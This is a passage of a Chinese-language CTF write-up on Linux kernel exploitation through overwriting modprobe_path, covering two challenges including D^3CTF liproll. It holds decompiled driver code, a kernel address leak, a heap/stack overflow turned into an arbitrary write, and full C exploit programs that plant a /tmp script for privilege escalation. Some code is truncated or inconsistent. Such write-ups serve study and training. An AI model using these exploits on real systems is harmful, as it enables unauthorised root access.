        if(-1 == ioctl(fd, 0xDEADBEEF, NULL)){
            printf('print error\n');
        }
    }
    void main(){
        system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/getflag.sh");
        system("chmod +x /tmp/getflag.sh");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/ll");
        system("chmod +x /tmp/ll");
        fd = open("/dev/meizijiutql", O_RDWR);
        char buf[0x1000] = { 0 };
        char mod[0x20] = { 0 };
        cmalloc(168);
        char buff[150] = "%llx-%llx-%llx-%llx-%llx-kernel:%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx";
        write(fd, buff, 150);
        printf("=========>begin leak addr\n");
        cprintf();
        cprintf();
        printf("===== please input modprobe_path(kernel_addr+0x107a0a1) addr:\n");
        scanf("%lx",mod);
        printf("modprobe_path:0x%lx\n",mod);
        printf("kmalloc first\n");
        cmalloc(0x80);
        write(fd, buf, 0x60);
        cprintf();
        cprintf();
        cmalloc(0x400);
        cmalloc(0x400);
        memset(buf, 'a', 0x400);
        strncat(buf, mod, 0x8);
        printf("modprobe_path: %lx\n",buf[0x400]);
        cmalloc(0x400);
        printf("chunk overflow\n");
        write(fd, buf, 0x408);
        cmalloc(0x400);
        write(fd, "/tmp/getflag.sh", 0x20);
        cmalloc(0x400);
        printf("change modprobe_path\n");
        write(fd, "/tmp/getflag.sh", 0x20);
        close(fd);
        system("/tmp/ll");
        system("cat /tmp/flag");
    }
## 2020-D^3CTF liproll
###  漏洞分析
    __int64 __fastcall liproll_unlocked_ioctl(__int64 a1, unsigned int a2, unsigned int *a3)
    {
      __int64 result; // rax
      if ( a2 == 0xD3C7F03 )
      {
        create_a_spell();
        result = 0LL;
      }
      else if ( a2 > 0xD3C7F03 )
      {
        if ( a2 != 0xD3C7F04 )
          return 0LL;
        choose_a_spell(a3);
        result = 0LL;
      }
      else
      {
        if ( a2 != 0xD3C7F01 )
        {
          if ( a2 == 0xD3C7F02 )
          {
            global_buffer = 0LL;
            *(&global_buffer + 1) = 0LL;
          }
          return 0LL;
        }
        cast_a_spell(a3);
        result = 0LL;
      }
      return result;
    }
主要实现了四种功能，`create_spell`是创建一个 `spell`结构体并为其分配内存，将其保存在`list`中
；`choose_a_spell`是从 list中选择
一个`spell`结构体；`cast_spell`主要功能是将用户传入的字符串拷贝到`global_buffer`中：
    unsigned __int64 __fastcall cast_a_spell(__int64 *a1)
    {
      unsigned int size; // eax
      int v2; // edx
      __int64 src; // rsi
      _BYTE dst[256]; // [rsp+0h] [rbp-120h] BYREF
      void *global_buf1; // [rsp+100h] [rbp-20h]
      int v7; // [rsp+108h] [rbp-18h]
      unsigned __int64 v8; // [rsp+110h] [rbp-10h]
      v8 = __readgsqword(0x28u);
      if ( !global_buffer )
        return cast_a_spell_cold();
      global_buf1 = global_buffer;
      size = *((_DWORD *)a1 + 2);
      v2 = 256;
      src = *a1;
      if ( size  x/28i 0xffffffff9d800000
       0xffffffff9d800000:  lea    rsp,[rip+0x1403f51]        # 0xffffffff9ec03f58
       0xffffffff9d800007:  call   0xffffffff9d8000f0
       0xffffffff9d80000c:  lea    rdi,[rip+0xffffffffffffffed]        # 0xffffffff9d800000
       0xffffffff9d800013:  push   rsi
       0xffffffff9d800014:  call   0xffffffff9d800200
       0xffffffff9d800019:  pop    rsi
       0xffffffff9d80001a:  add    rax,0x1f256000
       0xffffffff9d800020:  jmp    0xffffffff9d800042
       0xffffffff9d800022:  data16 nop WORD PTR cs:[rax+rax*1+0x0]
       0xffffffff9d80002d:  nop    DWORD PTR [rax]
       0xffffffff9d800030:  call   0xffffffff9d8000f0
       0xffffffff9d800035:  push   rsi
       0xffffffff9d800036:  call   0xffffffff9e528460
       0xffffffff9d80003b:  pop    rsi
       0xffffffff9d80003c:  add    rax,0x1ec0a000
       0xffffffff9d800042:  mov    ecx,0xa0
       0xffffffff9d800047:  test   DWORD PTR [rip+0x12d0807],0x1        # 0xffffffff9ead0858
       0xffffffff9d800051:  je     0xffffffff9d800059
       0xffffffff9d800053:  or     ecx,0x1000
       0xffffffff9d800059:  mov    cr4,rcx
       0xffffffff9d80005c:  add    rax,QWORD PTR [rip+0x1411fad]        # 0xffffffff9ec12010
       0xffffffff9d800063:  mov    cr3,rax
       0xffffffff9d800066:  mov    rax,0xffffffff9d80006f                //此处存在vmlinux地址
**_覆写modprobe_path_**
得到`modprobe_path`地址后。我们按照上述的缓冲区溢出漏洞构造任意地址写。构造数据如下：
        memset(buffer, 0x0, 0x100);
        (unsigned long long)buffer[0x100] = modprobe_path;
        printf("buffer_addr: 0x%llx\n", buffer[0x100]);
那么即可将 `global_buffer`的地址修改为 `modprobe_path`的地址。然后我们再次执行 `cast_a_spell`向
`modprobe_path`地址处写入我们自己伪造的`shell`文件。即可实现获得`flag`。
`EXP`如下：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef struct Spell_struct{
        char* buf;
        unsigned int * size; 
    }Spell;
    void create(int fd){
        if(0  /tmp/getflag.sh");
        system("chmod +x /tmp/getflag.sh");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fl");
        system("chmod +x /tmp/fl");
        int fd = 0;
        fd = open("/dev/liproll",O_RDWR);
        create(fd);
        create(fd);
        char buffer[0x200] = { 0 };
        choose(fd, 0);
        choose(fd, 16);
        read(fd, buffer, 0x100);
        for(int i=0; i<60; i++){
             printf("buffer_value: %d 0x%x\n", i, (int)buffer[i]);
        }
        unsigned int vmlinx_addr = *(unsigned int*)(buffer+0x69);
        printf("vmlibux_addr: 0x%lx", vmlinux_addr);
        unsigned long long vmlinux_base = 0xffffffff00000000 + (vmlinux_addr & 0xffff0000);
        unsigned long long modprobe_path  = 0x1448460 + vmlinux_base;
        printf("vmlinux_base : 0x%llx\n",vmlinux_base);
        printf("modprobe_path : 0x%llx\n",modprobe_path);
        memset(buffer, 0x0, 0x100);
        *(unsigned long long *)(buffer+0x100) = modprobe_path;
        printf("buffer_addr: 0x%llx\n %p\n", (size_t)buffer[0x100], &buffer);
        Spell spell_user;
        spell_user.buf =  buffer;
        spell_user.size = 0x108;
        choose(fd, 0);
        cast(fd, spell_user);
        char modname[0x20] ={ 0 };
        strncpy(modname, "/tmp/getflag.sh", 0x20);
        spell_user.buf = modname;
        cast(fd, spell_user);
        getchar();
        system("/tmp/fl");
        system("cat /tmp/flag");
        return;
    }
## 总结
覆写`modprobe_path`来在`Kernel`中完成提权，其使用条件比较简单，有时候能帮助我们降低解体难度，是一种十分可靠和简洁的思路。当然还有类似的思路，也是值得我们后续深入学习。
## 参考
[Linux Kernel Exploitation Technique: Overwriting
modprobe_path](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/)
[Linux Kernel Exploit 内核漏洞学习(4)-RW Any Memory](https://xz.aliyun.com/t/6067)